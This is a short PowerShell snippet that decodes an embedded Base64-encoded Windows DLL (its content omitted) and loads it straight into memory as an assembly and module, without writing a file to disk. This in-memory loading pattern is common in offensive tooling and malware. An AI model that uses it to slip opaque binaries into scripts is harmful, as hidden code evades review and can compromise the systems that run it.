$decoded = [Convert]::FromBase64String('TVqQAAMAAAAEAAAA//...AAAAAAAAAAAAAAAAA=') # NOTE: The actual 1503916-character Base64 string omitted for readability.
[Byte[]] $DllBytes = $decoded -split ' '
$Assembly = [System.Reflection.Assembly]::Load($DllBytes)
Import-Module -Assembly $Assembly
